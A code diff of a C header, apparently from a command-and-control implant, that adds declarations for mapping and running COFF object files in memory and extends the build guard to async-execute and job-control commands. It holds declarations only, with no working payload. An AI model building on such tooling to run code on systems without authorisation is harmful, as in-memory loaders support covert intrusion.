@@ -6,7 +6,7 @@
 #include "Parser.h"
 #include "Config.h"
 
-#ifdef INCLUDE_CMD_INLINE_EXECUTE
+#if defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
 
 #if defined(__x86_64__) || defined(_WIN64)
 #define PREPENDSYMBOLVALUE "__imp_"
@@ -73,6 +73,8 @@ typedef struct coff_symbols_table {
     UINT8 NumberOfAuxSymbols;
 } Symbol_t;
 
+#pragma pack(pop)
+
 
 typedef struct COFF {
     char* FileBase;
@@ -87,11 +89,24 @@ typedef struct COFF {
     int FunctionMappingCount;
 } COFF_t;
 
+/* Mapped COFF ready for execute; caller owns lifetime until CoffUnmap */
+typedef struct COFF_RUNTIME {
+    COFF_t coff;
+    void** sectionMapped;
+    char*  functionMapping;
+    UINT16 numberOfSections;
+} COFF_RUNTIME_t;
 
+BOOL CoffMap(char* FileData, COFF_RUNTIME_t* out);
+BOOL CoffExecute(COFF_RUNTIME_t* rt, char* EntryName, char* argumentdata, unsigned long argumentsize);
+VOID CoffUnmap(COFF_RUNTIME_t* rt);
+
+#ifdef INCLUDE_CMD_INLINE_EXECUTE
 VOID InlineExecute(PCHAR taskUuid, PPARSER arguments);
+#endif
 
 BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdata, unsigned long argumentsize);
 
-#endif //INCLUDE_CMD_INLINE_EXECUTE
+#endif //INCLUDE_CMD_INLINE_EXECUTE || ASYNC family
 
 #endif  //INLINEEXECUTE_H
